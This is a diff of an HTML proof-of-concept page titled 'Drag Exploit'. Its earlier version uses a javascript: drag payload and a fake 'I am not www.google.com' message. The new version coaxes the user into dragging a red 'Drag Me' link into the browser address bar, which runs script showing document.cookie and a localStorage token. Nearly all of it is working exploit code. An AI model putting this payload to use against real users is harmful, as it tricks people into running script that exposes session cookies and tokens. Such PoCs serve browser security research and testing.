@@ -1,17 +1,24 @@
-<title>
-test</title>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Drag Exploit</title>
+</head>
 <body>
-<h1><a href="javascript:alert(location.origin)" id="a">Mama im a criminal</a></h1>
-</body>
+
+<h2>Drag this to the address bar 👇</h2>
+
+<a draggable="true" id="exploit" style="padding:10px;background:red;color:white;cursor:grab;">
+  Drag Me
+</a>
+
 <script>
-var spoof_url = 'alert(document.domain)';
-spoof_url = 'javascript:' + spoof_url;
-ondragstart= function() {
-  //event.dataTransfer.setData('text/plain','chrome://downloads/');
-  event.dataTransfer.setData('text/plain',spoof_url);
-}
-ondragend = function(){
-  document.title = 'Done';
-  document.write('<h1>I am not www.google.com at all!</h1>');
-}
+document.getElementById('exploit').ondragstart = function(e) {
+  e.dataTransfer.setData(
+    'text/plain',
+    "javascript:alert('Cookie: '+document.cookie+' | Token: '+localStorage.getItem('token'))"
+  );
+};
 </script>
+
+</body>
+</html>
